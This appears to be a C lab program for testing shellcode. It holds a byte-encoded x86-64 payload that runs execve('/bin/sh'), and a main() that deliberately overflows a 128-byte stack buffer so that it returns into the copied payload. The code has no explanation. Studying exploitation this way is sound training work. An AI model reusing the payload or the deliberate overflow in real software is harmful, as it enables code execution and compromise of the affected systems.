#include <stdio.h>


char shellcode[] = "\x31\xc0\xeb\x08\x2f\x62\x69\x6e\x2f\x73\x68\x00\xb0\x3b\x48\x8d\x3d\xef\xff\xff\xff\x31\xd2\x31\xf6\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00\x48\xc7\xc7\x00\x00\x00\x00\x0f\x05";
int i = 0;


int main() {
    char buffer[128];
    long *ptr = (long *) buffer;

    for (i = 0; i < 20; i++) {
        ptr[i] = (long) buffer;
    }

    for (i = 0; i < sizeof(shellcode); i++) {
        buffer[i] = shellcode[i];
    }

    return 12;
}
